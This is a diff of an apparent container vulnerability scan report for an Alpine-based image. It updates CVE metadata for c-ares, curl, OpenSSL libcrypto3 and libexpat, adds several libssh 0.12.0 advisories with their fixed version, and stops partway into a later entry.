@@ -36,17 +36,22 @@
 │                       │       │                   potential for further impact depending on the allocator and
 │                       │       │                    build configuration. 
 │                       │       ├ Severity        : HIGH 
-│                       │       ├ VendorSeverity   ─ redhat: 3 
+│                       │       ├ VendorSeverity   ╭ alma  : 3 
+│                       │       │                  ├ amazon: 3 
+│                       │       │                  ╰ redhat: 3 
 │                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
 │                       │       │                           │           N/A:H 
 │                       │       │                           ╰ V3Score : 7.5 
-│                       │       ╰ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-33630 
-│                       │                          ├ [1]: https://github.com/c-ares/c-ares/commit/1fa3b86a0b8d1
+│                       │       ╰ References       ╭ [0]: https://access.redhat.com/errata/RHSA-2026:42096 
+│                       │                          ├ [1]: https://access.redhat.com/security/cve/CVE-2026-33630 
+│                       │                          ├ [2]: https://bugzilla.redhat.com/2497686 
+│                       │                          ├ [3]: https://errata.almalinux.org/10/ALSA-2026-42096.html 
+│                       │                          ├ [4]: https://github.com/c-ares/c-ares/commit/1fa3b86a0b8d1
 │                       │                          │      8fe7b60f3228a01d770feb026bc 
-│                       │                          ├ [2]: https://github.com/c-ares/c-ares/commit/d823199b68805
+│                       │                          ├ [5]: https://github.com/c-ares/c-ares/commit/d823199b68805
 │                       │                          │      2dcdc1646f2ab4cb8c16b1c644a 
-│                       │                          ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-33630 
-│                       │                          ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-33630 
+│                       │                          ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-33630 
+│                       │                          ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-33630 
 │                       ├ [1]   ╭ VulnerabilityID : CVE-2026-11352 
 │                       │       ├ PkgID           : curl@8.20.0-r1 
 │                       │       ├ PkgName         : curl 
@@ -301,8 +306,8 @@
 │                       │       │                  ╰ URL : https://secdb.alpinelinux.org/ 
 │                       │       ├ Fingerprint     : sha256:451cd0f35f2513c1c42667bd1c6b972999d7215fd0dee9113e72
 │                       │       │                   2f865519a2ab 
-│                       │       ├ Title           : libcurl: libcurl: Information disclosure due to uncleared
-│                       │       │                   proxy authentication state 
+│                       │       ├ Title           : curl: Information disclosure due to uncleared proxy
+│                       │       │                   authentication state 
 │                       │       ├ Description     : When reusing a libcurl handle for sequential transfers
 │                       │       │                   driven by
 │                       │       │                   environment-variable proxy configuration, libcurl fails to
@@ -1157,8 +1162,8 @@
 │                       │       │                  ╰ URL : https://secdb.alpinelinux.org/ 
 │                       │       ├ Fingerprint     : sha256:fad9150c15de56bbc18fd067abba5e830d7c8412cf6452a55190
 │                       │       │                   47cf7a988f70 
-│                       │       ├ Title           : libcurl: libcurl: Information disclosure due to uncleared
-│                       │       │                   proxy authentication state 
+│                       │       ├ Title           : curl: Information disclosure due to uncleared proxy
+│                       │       │                   authentication state 
 │                       │       ├ Description     : When reusing a libcurl handle for sequential transfers
 │                       │       │                   driven by
 │                       │       │                   environment-variable proxy configuration, libcurl fails to
@@ -2028,7 +2033,7 @@
 │                       │       │                  ├ [71]: https://ubuntu.com/security/notices/USN-8414-2 
 │                       │       │                  ╰ [72]: https://www.cve.org/CVERecord?id=CVE-2026-45447 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:19.277Z 
-│                       │       ╰ LastModifiedDate: 2026-07-15T14:18:11.573Z 
+│                       │       ╰ LastModifiedDate: 2026-07-20T12:19:30.657Z 
 │                       ├ [40]  ╭ VulnerabilityID : CVE-2026-34182 
 │                       │       ├ PkgID           : libcrypto3@3.5.6-r0 
 │                       │       ├ PkgName         : libcrypto3 
@@ -3650,7 +3655,7 @@
 │                       │       │                   using X9.42 DHX static keys with interactive protocols and
 │                       │       │                   therefore this
 │                       │       │                   issue was assigned Low severity.
-│                       │       │                   The FIPS modules in 4.0, 3.6, 3.5, 3.4, and 3.0 are
+│                       │       │                   The FIPS modules in 4.0, 3.6, 3.5, 3.4, 3.1.2 and 3.0 are
 │                       │       │                   affected by this
 │                       │       │                   issue. 
 │                       │       ├ Severity        : LOW 
@@ -3746,7 +3751,7 @@
 │                       │       │                  ├ [58]: https://ubuntu.com/security/notices/USN-8414-1 
 │                       │       │                  ╰ [59]: https://www.cve.org/CVERecord?id=CVE-2026-42770 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:08.523Z 
-│                       │       ╰ LastModifiedDate: 2026-06-17T10:48:22.65Z 
+│                       │       ╰ LastModifiedDate: 2026-07-20T17:17:08.87Z 
 │                       ├ [51]  ╭ VulnerabilityID : CVE-2026-45446 
 │                       │       ├ PkgID           : libcrypto3@3.5.6-r0 
 │                       │       ├ PkgName         : libcrypto3 
@@ -4499,8 +4504,8 @@
 │                       │       │                  ╰ URL : https://secdb.alpinelinux.org/ 
 │                       │       ├ Fingerprint     : sha256:e17fbd0600883085b9a2c76411d07c997fb35ffdc7e1ade69703
 │                       │       │                   d8f04e92274b 
-│                       │       ├ Title           : libcurl: libcurl: Information disclosure due to uncleared
-│                       │       │                   proxy authentication state 
+│                       │       ├ Title           : curl: Information disclosure due to uncleared proxy
+│                       │       │                   authentication state 
 │                       │       ├ Description     : When reusing a libcurl handle for sequential transfers
 │                       │       │                   driven by
 │                       │       │                   environment-variable proxy configuration, libcurl fails to
@@ -5239,7 +5244,7 @@
 │                       │       │                  ├ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-50219 
 │                       │       │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-50219 
 │                       │       ├ PublishedDate   : 2026-06-04T06:16:25.05Z 
-│                       │       ╰ LastModifiedDate: 2026-06-17T10:57:38.927Z 
+│                       │       ╰ LastModifiedDate: 2026-07-22T20:10:00.127Z 
 │                       ├ [76]  ╭ VulnerabilityID : CVE-2026-56132 
 │                       │       ├ PkgID           : libexpat@2.8.1-r0 
 │                       │       ├ PkgName         : libexpat 
@@ -5586,7 +5591,432 @@
 │                       │       │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-56412 
 │                       │       ├ PublishedDate   : 2026-06-21T17:16:44.657Z 
 │                       │       ╰ LastModifiedDate: 2026-06-23T15:31:30.853Z 
-│                       ├ [85]  ╭ VulnerabilityID : CVE-2026-55199 
+│                       ├ [85]  ╭ VulnerabilityID : CVE-2026-59851 
+│                       │       ├ PkgID           : libssh@0.12.0-r0 
+│                       │       ├ PkgName         : libssh 
+│                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3
+│                       │       │                  │       .24.0_alpha20260127 
+│                       │       │                  ╰ UID : 5849b769800139b 
+│                       │       ├ InstalledVersion: 0.12.0-r0 
+│                       │       ├ FixedVersion    : 0.12.1-r0 
+│                       │       ├ Status          : fixed 
+│                       │       ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e12
+│                       │       │                  │         79a8305ba35c82bf9229f 
+│                       │       │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680
+│                       │       │                            f7ea46f72dd8aa890c14b 
+│                       │       ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59851 
+│                       │       ├ DataSource       ╭ ID  : alpine 
+│                       │       │                  ├ Name: Alpine Secdb 
+│                       │       │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │       ├ Fingerprint     : sha256:ef3d778ddbde247a388f1ba48680a2ed5fdc3a52051e9d6dc8d7
+│                       │       │                   48391465d655 
+│                       │       ├ Title           : libssh: libssh: authentication bypass via missing GSSAPI
+│                       │       │                   principal check 
+│                       │       ├ Description     : A flaw was found in libssh. On servers with
+│                       │       │                   GSSAPIKeyExchange enabled, the gssapi-keyex path does not
+│                       │       │                   verify whether the authenticated Kerberos principal is
+│                       │       │                   authorized for the requested local user, allowing
+│                       │       │                   authenticated clients to log in as arbitrary users. 
+│                       │       ├ Severity        : HIGH 
+│                       │       ├ CweIDs           ─ [0]: CWE-863 
+│                       │       ├ VendorSeverity   ─ redhat: 3 
+│                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:
+│                       │       │                           │           H/A:H 
+│                       │       │                           ╰ V3Score : 8.8 
+│                       │       ├ References       ╭ [0]: https://access.redhat.com/errata/RHSA-2026:42922 
+│                       │       │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2026-59851 
+│                       │       │                  ├ [2]: https://bugzilla.redhat.com/show_bug.cgi?id=2498184 
+│                       │       │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-59851 
+│                       │       │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-59851 
+│                       │       ├ PublishedDate   : 2026-07-21T15:16:37.897Z 
+│                       │       ╰ LastModifiedDate: 2026-07-22T20:17:04.877Z 
+│                       ├ [86]  ╭ VulnerabilityID : CVE-2026-15370 
+│                       │       ├ PkgID           : libssh@0.12.0-r0 
+│                       │       ├ PkgName         : libssh 
+│                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3
+│                       │       │                  │       .24.0_alpha20260127 
+│                       │       │                  ╰ UID : 5849b769800139b 
+│                       │       ├ InstalledVersion: 0.12.0-r0 
+│                       │       ├ FixedVersion    : 0.12.1-r0 
+│                       │       ├ Status          : fixed 
+│                       │       ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e12
+│                       │       │                  │         79a8305ba35c82bf9229f 
+│                       │       │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680
+│                       │       │                            f7ea46f72dd8aa890c14b 
+│                       │       ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-15370 
+│                       │       ├ DataSource       ╭ ID  : alpine 
+│                       │       │                  ├ Name: Alpine Secdb 
+│                       │       │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │       ├ Fingerprint     : sha256:8f81fdd47f142827ad4dedfd5c431f97cb9dc1901389a8312a1a
+│                       │       │                   82161c55f458 
+│                       │       ├ Title           : libssh: libssh: stack buffer overflow in SFTP server
+│                       │       │                   longname construction 
+│                       │       ├ Description     : A flaw was found in libssh. During SFTP server directory
+│                       │       │                   listing, the longname field is constructed with unsafe
+│                       │       │                   concatenation into a fixed-size stack buffer. When a client
+│                       │       │                    causes the server to list attacker-controlled filenames,
+│                       │       │                   sufficiently long names can overflow that stack buffer and
+│                       │       │                   may lead to crashes or possible code execution on the
+│                       │       │                   server. 
+│                       │       ├ Severity        : MEDIUM 
+│                       │       ├ CweIDs           ─ [0]: CWE-121 
+│                       │       ├ VendorSeverity   ─ redhat: 2 
+│                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:
+│                       │       │                           │           H/A:H 
+│                       │       │                           ╰ V3Score : 6.7 
+│                       │       ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-15370 
+│                       │       │                  ├ [1]: https://bugzilla.redhat.com/show_bug.cgi?id=2499049 
+│                       │       │                  ├ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-15370 
+│                       │       │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-15370 
+│                       │       ├ PublishedDate   : 2026-07-21T09:16:53.683Z 
+│                       │       ╰ LastModifiedDate: 2026-07-22T18:16:55.26Z 
+│                       ├ [87]  ╭ VulnerabilityID : CVE-2026-59843 
+│                       │       ├ PkgID           : libssh@0.12.0-r0 
+│                       │       ├ PkgName         : libssh 
+│                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3
+│                       │       │                  │       .24.0_alpha20260127 
+│                       │       │                  ╰ UID : 5849b769800139b 
+│                       │       ├ InstalledVersion: 0.12.0-r0 
+│                       │       ├ FixedVersion    : 0.12.1-r0 
+│                       │       ├ Status          : fixed 
+│                       │       ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e12
+│                       │       │                  │         79a8305ba35c82bf9229f 
+│                       │       │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680
+│                       │       │                            f7ea46f72dd8aa890c14b 
+│                       │       ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59843 
+│                       │       ├ DataSource       ╭ ID  : alpine 
+│                       │       │                  ├ Name: Alpine Secdb 
+│                       │       │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │       ├ Fingerprint     : sha256:7771611fc2165d846a5073ad7ec967d7a6a9f256d4648e33e20b
+│                       │       │                   4c8f0d757917 
+│                       │       ├ Title           : libssh: libssh: denial of service via zero advertised
+│                       │       │                   channel packet size 
+│                       │       ├ Description     : A flaw was found in libssh. A remote authenticated peer can
+│                       │       │                    advertise a zero maximum packet size in
+│                       │       │                   SSH_MSG_CHANNEL_OPEN, causing later channel writes to loop
+│                       │       │                   indefinitely and consume CPU, leading to denial of
+│                       │       │                   service. 
+│                       │       ├ Severity        : MEDIUM 
+│                       │       ├ CweIDs           ─ [0]: CWE-400 
+│                       │       ├ VendorSeverity   ─ redhat: 2 
+│                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:
+│                       │       │                           │           N/A:H 
+│                       │       │                           ╰ V3Score : 6.5 
+│                       │       ├ References       ╭ [0]: https://access.redhat.com/errata/RHSA-2026:42922 
+│                       │       │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2026-59843 
+│                       │       │                  ├ [2]: https://bugzilla.redhat.com/show_bug.cgi?id=2498176 
+│                       │       │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-59843 
+│                       │       │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-59843 
+│                       │       ├ PublishedDate   : 2026-07-21T12:18:57.86Z 
+│                       │       ╰ LastModifiedDate: 2026-07-22T20:17:03.287Z 
+│                       ├ [88]  ╭ VulnerabilityID : CVE-2026-59844 
+│                       │       ├ PkgID           : libssh@0.12.0-r0 
+│                       │       ├ PkgName         : libssh 
+│                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3
+│                       │       │                  │       .24.0_alpha20260127 
+│                       │       │                  ╰ UID : 5849b769800139b 
+│                       │       ├ InstalledVersion: 0.12.0-r0 
+│                       │       ├ FixedVersion    : 0.12.1-r0 
+│                       │       ├ Status          : fixed 
+│                       │       ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e12
+│                       │       │                  │         79a8305ba35c82bf9229f 
+│                       │       │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680
+│                       │       │                            f7ea46f72dd8aa890c14b 
+│                       │       ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59844 
+│                       │       ├ DataSource       ╭ ID  : alpine 
+│                       │       │                  ├ Name: Alpine Secdb 
+│                       │       │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │       ├ Fingerprint     : sha256:a399edc120859b12791b1419d3229031f7fd5fda1d0a28cf8687
+│                       │       │                   29932c329b6e 
+│                       │       ├ Title           : libssh: libssh: denial of service via oversized SFTP read
+│                       │       │                   length 
+│                       │       ├ Description     : A flaw was found in libssh. A remote authenticated client
+│                       │       │                   can issue SSH_FXP_READ requests with an arbitrarily large
+│                       │       │                   length, causing a libssh SFTP server to allocate excessive
+│                       │       │                   memory and potentially exhaust it through repeated
+│                       │       │                   requests. 
+│                       │       ├ Severity        : MEDIUM 
+│                       │       ├ CweIDs           ─ [0]: CWE-789 
+│                       │       ├ VendorSeverity   ─ redhat: 2 
+│                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:
+│                       │       │                           │           N/A:H 
+│                       │       │                           ╰ V3Score : 6.5 
+│                       │       ├ References       ╭ [0]: https://access.redhat.com/errata/RHSA-2026:42922 
+│                       │       │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2026-59844 
+│                       │       │                  ├ [2]: https://bugzilla.redhat.com/show_bug.cgi?id=2498177 
+│                       │       │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-59844 
+│                       │       │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-59844 
+│                       │       ├ PublishedDate   : 2026-07-21T12:18:57.973Z 
+│                       │       ╰ LastModifiedDate: 2026-07-22T20:17:03.443Z 
+│                       ├ [89]  ╭ VulnerabilityID : CVE-2026-59845 
+│                       │       ├ PkgID           : libssh@0.12.0-r0 
+│                       │       ├ PkgName         : libssh 
+│                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3
+│                       │       │                  │       .24.0_alpha20260127 
+│                       │       │                  ╰ UID : 5849b769800139b 
+│                       │       ├ InstalledVersion: 0.12.0-r0 
+│                       │       ├ FixedVersion    : 0.12.1-r0 
+│                       │       ├ Status          : fixed 
+│                       │       ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e12
+│                       │       │                  │         79a8305ba35c82bf9229f 
+│                       │       │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680
+│                       │       │                            f7ea46f72dd8aa890c14b 
+│                       │       ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59845 
+│                       │       ├ DataSource       ╭ ID  : alpine 
+│                       │       │                  ├ Name: Alpine Secdb 
+│                       │       │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │       ├ Fingerprint     : sha256:7cab232660e96a31d165ec927d4ea4b99972cdb0b487884488af
+│                       │       │                   eda355804962 
+│                       │       ├ Title           : libssh: libssh: denial of service via unchecked
+│                       │       │                   ProxyCommand fork() failure 
+│                       │       ├ Description     : A flaw was found in libssh. When ProxyCommand is used, an
+│                       │       │                   unchecked fork() failure can be stored as process ID -1;
+│                       │       │                   during cleanup, signals may then be sent across the
+│                       │       │                   caller's accessible process tree, leading to local denial
+│                       │       │                   of service. 
+│                       │       ├ Severity        : MEDIUM 
+│                       │       ├ VendorSeverity   ─ redhat: 2 
+│                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:N/I:
+│                       │       │                           │           N/A:H 
+│                       │       │                           ╰ V3Score : 5.3 
+│                       │       ├ References       ╭ [0]: https://access.redhat.com/errata/RHSA-2026:42922 
+│                       │       │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2026-59845 
+│                       │       │                  ├ [2]: https://bugzilla.redhat.com/show_bug.cgi?id=2498178 
+│                       │       │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-59845 
+│                       │       │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-59845 
+│                       │       ├ PublishedDate   : 2026-07-21T12:18:58.103Z 
+│                       │       ╰ LastModifiedDate: 2026-07-22T20:17:03.6Z 
+│                       ├ [90]  ╭ VulnerabilityID : CVE-2026-59847 
+│                       │       ├ PkgID           : libssh@0.12.0-r0 
+│                       │       ├ PkgName         : libssh 
+│                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3
+│                       │       │                  │       .24.0_alpha20260127 
+│                       │       │                  ╰ UID : 5849b769800139b 
+│                       │       ├ InstalledVersion: 0.12.0-r0 
+│                       │       ├ FixedVersion    : 0.12.1-r0 
+│                       │       ├ Status          : fixed 
+│                       │       ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e12
+│                       │       │                  │         79a8305ba35c82bf9229f 
+│                       │       │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680
+│                       │       │                            f7ea46f72dd8aa890c14b 
+│                       │       ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59847 
+│                       │       ├ DataSource       ╭ ID  : alpine 
+│                       │       │                  ├ Name: Alpine Secdb 
+│                       │       │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │       ├ Fingerprint     : sha256:789aa6bc44cd693c30c2801332e5e82f1cd8d0551d6681cc4915
+│                       │       │                   3b51dc93d687 
+│                       │       ├ Title           : libssh: libssh: integrity downgrade via OpenSSL AES-GCM tag
+│                       │       │                    verification 
+│                       │       ├ Description     : A flaw was found in libssh. Incorrect AES-GCM finalization
+│                       │       │                   checks in builds using the OpenSSL backend can effectively
+│                       │       │                   remove integrity protection, allowing an in-path attacker
+│                       │       │                   to modify plaintext on the wire without detection. 
+│                       │       ├ Severity        : MEDIUM 
+│                       │       ├ CweIDs           ─ [0]: CWE-1310 
+│                       │       ├ VendorSeverity   ─ redhat: 2 
+│                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:
+│                       │       │                           │           H/A:N 
+│                       │       │                           ╰ V3Score : 5.9 
+│                       │       ├ References       ╭ [0]: https://access.redhat.com/errata/RHSA-2026:42922 
+│                       │       │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2026-59847 
+│                       │       │                  ├ [2]: https://bugzilla.redhat.com/show_bug.cgi?id=2498180 
+│                       │       │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-59847 
+│                       │       │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-59847 
+│                       │       ├ PublishedDate   : 2026-07-21T14:16:34.657Z 
+│                       │       ╰ LastModifiedDate: 2026-07-22T20:17:03.95Z 
+│                       ├ [91]  ╭ VulnerabilityID : CVE-2026-59848 
+│                       │       ├ PkgID           : libssh@0.12.0-r0 
+│                       │       ├ PkgName         : libssh 
+│                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3
+│                       │       │                  │       .24.0_alpha20260127 
+│                       │       │                  ╰ UID : 5849b769800139b 
+│                       │       ├ InstalledVersion: 0.12.0-r0 
+│                       │       ├ FixedVersion    : 0.12.1-r0 
+│                       │       ├ Status          : fixed 
+│                       │       ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e12
+│                       │       │                  │         79a8305ba35c82bf9229f 
+│                       │       │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680
+│                       │       │                            f7ea46f72dd8aa890c14b 
+│                       │       ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59848 
+│                       │       ├ DataSource       ╭ ID  : alpine 
+│                       │       │                  ├ Name: Alpine Secdb 
+│                       │       │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │       ├ Fingerprint     : sha256:68296a0d1fc627e63fe5d3ea1240730f87e7899919cbbc3859a5
+│                       │       │                   00fec7b09835 
+│                       │       ├ Title           : libssh: libssh: denial of service via SFTP responses with
+│                       │       │                   unknown request IDs 
+│                       │       ├ Description     : A flaw was found in libssh. A malicious SFTP server can
+│                       │       │                   send responses for unknown request IDs that libssh clients
+│                       │       │                   keep queued indefinitely, causing unbounded memory growth
+│                       │       │                   and client-side denial of service. 
+│                       │       ├ Severity        : MEDIUM 
+│                       │       ├ VendorSeverity   ─ redhat: 2 
+│                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+│                       │       │                           │           N/A:L 
+│                       │       │                           ╰ V3Score : 5.3 
+│                       │       ├ References       ╭ [0]: https://access.redhat.com/errata/RHSA-2026:42922 
+│                       │       │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2026-59848 
+│                       │       │                  ├ [2]: https://bugzilla.redhat.com/show_bug.cgi?id=2498181 
+│                       │       │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-59848 
+│                       │       │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-59848 
+│                       │       ├ PublishedDate   : 2026-07-21T14:16:34.79Z 
+│                       │       ╰ LastModifiedDate: 2026-07-22T20:17:04.123Z 
+│                       ├ [92]  ╭ VulnerabilityID : CVE-2026-59850 
+│                       │       ├ PkgID           : libssh@0.12.0-r0 
+│                       │       ├ PkgName         : libssh 
+│                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3
+│                       │       │                  │       .24.0_alpha20260127 
+│                       │       │                  ╰ UID : 5849b769800139b 
+│                       │       ├ InstalledVersion: 0.12.0-r0 
+│                       │       ├ FixedVersion    : 0.12.1-r0 
+│                       │       ├ Status          : fixed 
+│                       │       ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e12
+│                       │       │                  │         79a8305ba35c82bf9229f 
+│                       │       │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680
+│                       │       │                            f7ea46f72dd8aa890c14b 
+│                       │       ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59850 
+│                       │       ├ DataSource       ╭ ID  : alpine 
+│                       │       │                  ├ Name: Alpine Secdb 
+│                       │       │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │       ├ Fingerprint     : sha256:89887d895bcaf9e5c0fd6276856b0297e4949d12123944be2746
+│                       │       │                   2e13feb9db77 
+│                       │       ├ Title           : libssh: libssh: use-after-free via data callbacks on closed
+│                       │       │                    channels 
+│                       │       ├ Description     : A flaw was found in libssh. If data packets are processed
+│                       │       │                   after a channel is closed, channel data callbacks can be
+│                       │       │                   invoked after the associated data has already been freed,
+│                       │       │                   leading to crashes or possible use-after-free conditions.[
+│                       │       │                   m 
+│                       │       ├ Severity        : MEDIUM 
+│                       │       ├ CweIDs           ─ [0]: CWE-416 
+│                       │       ├ VendorSeverity   ─ redhat: 2 
+│                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:
+│                       │       │                           │           N/A:L 
+│                       │       │                           ╰ V3Score : 4.3 
+│                       │       ├ References       ╭ [0]: https://access.redhat.com/errata/RHSA-2026:42922 
+│                       │       │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2026-59850 
+│                       │       │                  ├ [2]: https://bugzilla.redhat.com/show_bug.cgi?id=2498183 
+│                       │       │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-59850 
+│                       │       │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-59850 
+│                       │       ├ PublishedDate   : 2026-07-21T15:16:37.773Z 
+│                       │       ╰ LastModifiedDate: 2026-07-22T20:17:04.693Z 
+│                       ├ [93]  ╭ VulnerabilityID : CVE-2026-59842 
+│                       │       ├ PkgID           : libssh@0.12.0-r0 
+│                       │       ├ PkgName         : libssh 
+│                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3
+│                       │       │                  │       .24.0_alpha20260127 
+│                       │       │                  ╰ UID : 5849b769800139b 
+│                       │       ├ InstalledVersion: 0.12.0-r0 
+│                       │       ├ FixedVersion    : 0.12.1-r0 
+│                       │       ├ Status          : fixed 
+│                       │       ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e12
+│                       │       │                  │         79a8305ba35c82bf9229f 
+│                       │       │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680
+│                       │       │                            f7ea46f72dd8aa890c14b 
+│                       │       ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59842 
+│                       │       ├ DataSource       ╭ ID  : alpine 
+│                       │       │                  ├ Name: Alpine Secdb 
+│                       │       │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │       ├ Fingerprint     : sha256:ffc6669a6a0d41a6772580c21a6441dc0fbdf8b1f26e307797a2
+│                       │       │                   f16b262114e9 
+│                       │       ├ Title           : libssh: libssh: information disclosure via short GSSAPI
+│                       │       │                   Curve25519 public key 
+│                       │       ├ Description     : A flaw was found in libssh. During server-side GSSAPI key
+│                       │       │                   exchange, a client-supplied Curve25519 public key shorter
+│                       │       │                   than the expected length is copied without proper length
+│                       │       │                   validation, leading to an out-of-bounds heap read. This
+│                       │       │                   could allow a remote unauthenticated attacker to disclose
+│                       │       │                   small amounts of server memory. 
+│                       │       ├ Severity        : LOW 
+│                       │       ├ CweIDs           ─ [0]: CWE-125 
+│                       │       ├ VendorSeverity   ─ redhat: 1 
+│                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:
+│                       │       │                           │           N/A:N 
+│                       │       │                           ╰ V3Score : 3.7 
+│                       │       ├ References       ╭ [0]: https://access.redhat.com/errata/RHSA-2026:42922 
+│                       │       │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2026-59842 
+│                       │       │                  ├ [2]: https://bugzilla.redhat.com/show_bug.cgi?id=2498168 
+│                       │       │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-59842 
+│                       │       │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-59842 
+│                       │       ├ PublishedDate   : 2026-07-21T12:18:57.727Z 
+│                       │       ╰ LastModifiedDate: 2026-07-22T20:17:03.12Z 
+│                       ├ [94]  ╭ VulnerabilityID : CVE-2026-59846 
+│                       │       ├ PkgID           : libssh@0.12.0-r0 
+│                       │       ├ PkgName         : libssh 
